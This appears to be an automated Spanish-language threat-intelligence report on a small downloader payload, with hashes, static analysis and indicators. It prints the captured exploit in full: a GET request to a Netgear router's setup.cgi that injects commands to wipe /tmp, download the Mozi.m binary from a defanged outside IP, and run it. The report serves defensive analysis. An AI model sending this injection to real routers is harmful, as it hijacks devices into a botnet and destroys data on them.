# 🧬 Payload Analysis

`23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21`

## 📌 Resumen

Texto ASCII de 175 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `netgear` en `hxxp://123.5.191.XXX:41911/Mozi.m+-O+/tmp/netgear`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh netgear`
2. `wget hxxp://123.5.191.XXX:41911/Mozi.m -O /tmp/netgear` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21.md](../../../../../malware-like/oraculo/downloader/23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:18:27.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21`
- **SHA1:** `0bbbcfe440f5c9b448f97b1b8666ab2958f51e5f`
- **MD5:** `91df38e077ac4cef03a6741337a0e4c7`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 175 B |
| Entropía | 5.12 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://123.5.191.XXX:41911/Mozi.m+-O+/tmp/netgear
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://123.5.191.XXX:41911/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 123.5.191.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://123.5.191.XXX:41911/Mozi.m+-O+/tmp/netgear | strings |
| hash | 23c9ef23708358afe6d5ff82786873a7106d5545c2cea6f57fed54e42b6d5e21 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
